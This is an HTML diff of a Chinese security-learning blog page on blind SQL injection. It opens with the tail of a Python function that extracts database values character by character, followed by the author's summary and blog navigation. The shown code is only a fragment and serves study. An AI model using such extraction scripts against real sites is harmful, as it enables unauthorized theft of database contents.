class="line">                char2=char</span><br><span class="line">                print(char,end=&quot;&quot;)</span><br><span class="line">                break</span><br><span class="line">        if char2==&apos;&apos;:</span><br><span class="line">            break</span><br><span class="line">    if value==&apos;&apos;:</span><br><span class="line">        print(&quot;爆元素值函数执行错误&quot;)</span><br><span class="line">        exit()</span><br><span class="line">    return value</span><br></pre></td></tr></table></figure>
+
+<p><strong>总结：</strong>初学python，只注重功能，没考虑代码的空间复杂度和时间复杂度，以小白现在的水平也只能写出这样的脚本了，同时也让小白意识到，自己该努力了。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/05/25/SQL注入姿势（3）/">SQL注入姿势（3）</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">obsem</a></p>
+        <p><span>发布时间:</span>2019-05-25, 00:00:00</p>
+        <p><span>最后更新:</span>2021-02-08, 20:52:03</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/05/25/SQL注入姿势（3）/" title="SQL注入姿势（3）">http://yoursite.com/2019/05/25/SQL注入姿势（3）/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/05/25/SQL注入姿势（3）/　　作者: obsem" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2019/06/07/xss学习总结/">
+                    xxs学习总结
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/05/12/SQL注入姿势（2）/">
+                    SQL注入姿势（2）
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#盲注"><span class="toc-number">1.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#bool盲注"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">bool盲注</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#时间盲注"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">时间盲注</span></a></li></ol></li></ol></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"SQL注入姿势（3）　| obsetear　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2019/06/07/xss学习总结/" title="上一篇: xxs学习总结">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/05/12/SQL注入姿势（2）/" title="下一篇: SQL注入姿势（2）">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/11/21/从文件上传到浅谈.htaccess文件的作用/">从文件上传到浅谈.htaccess文件的作用</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/19/记一次简单的渗透练习/">记一次简单的渗透练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/10/python 正则表达式小结（笔记）/">python正则表达式小结（笔记）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/08/upload-labs通关总结/">upload-labs通关小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/04/linux基础知识（笔记）/">Linux基础（笔记）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/03/BUUCTFweb部分解题思路2/">BUUCTFweb部分解题思路（PHP、Babysql、Upload、CheckIn）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/15/BUUCTF部分web题解/">BUUCTF部分web题解（easysql，easy_tornado，Ping Ping Ping）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/26/内网渗透之Linux提权姿势/">Linux提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/16/内网渗透之windows提权的几种姿势/">windows提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/06/内网渗透之免杀/">免杀</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/29/内网渗透之CobaltStrike/">CobaltStrike</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/26/内网渗透之Metasploit/">Metasploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/25/内网渗透之windows基础/">Windows基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/20/浅谈XXE漏洞：从XML到文件读取/">浅谈XXE漏洞：从XML到文件读取</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/04/SSRF漏洞/">SSRF漏洞小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/23/csrf漏洞小结/">CSRF漏洞小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/10/Mysql报错函数小结/">Mysql报错函数小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/10/文件包含漏洞小结/">浅谈文件包含漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/21/浅谈php一句话木马/">浅谈一句话木马</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/03/宽字节注入/">宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/23/攻防世界web系列/">攻防世界web系列</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/10/Owasp juice shop(一)/">Owasp juice shop(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/24/PHP代码审计之危险函数/">PHP代码审计之危险函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/22/PHP超级全局变量/">PHP超级全局变量</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/21/一些常见的编码/">一些常见的编码</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/17/命令执行&代码执行漏洞/">命令执行&代码执行漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/12/Web常见的源码泄露/">Web常见的源码泄露</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/09/RSA算法小结/">RSA算法小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/08/PHP反序列化/">PHP反序列化学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/04/i春秋-misc系列/">i春秋-misc系列</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/31/文件上传漏洞总结/">文件上传漏洞总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/28/隐写术/">隐写术</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/25/SQL注入一些过滤及绕过总结/">SQL注入一些过滤及绕过总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/21/SQL简单注入/">SQL简单注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/20/图片隐写/">图片隐写术</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/18/攻防世界——Misc系列/">攻防世界——Misc系列</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/14/Web——爆破wp/">WEB——爆破wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/10/WEB——php大法wp/">WEB——php大法wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/08/图片隐写——小苹果wp/">图片隐写——小苹果wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/10/xss挑战之旅学习笔记/">xss挑战之旅学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/07/xss学习总结/">xxs学习总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/25/SQL注入姿势（3）/">SQL注入姿势（3）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/12/SQL注入姿势（2）/">SQL注入姿势（2）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/10/SQL注入姿势（1）/">SQL注入姿势（1）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/06/PHP学习笔记（5）/">PHP学习笔记（5）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/05/PHP学习笔记（4）/">PHP学习笔记（4）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/28/php登录界面小结/">PHP登录界面小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/25/PHP学习笔记（3）/">PHP学习笔记（3）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/15/PHP学习笔记（2）/">PHP学习笔记（2）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/07/PHP学习笔记（1）/">PHP学习笔记（1）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/05/哈弗曼树/">哈弗曼树</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/27/css学习笔记/">CSS学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/25/HTML学习笔记/">HTML学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/25/MySQL的一些常用命令行总结/">MySQL的一些常用命令行总结</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016-2021 obsem
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
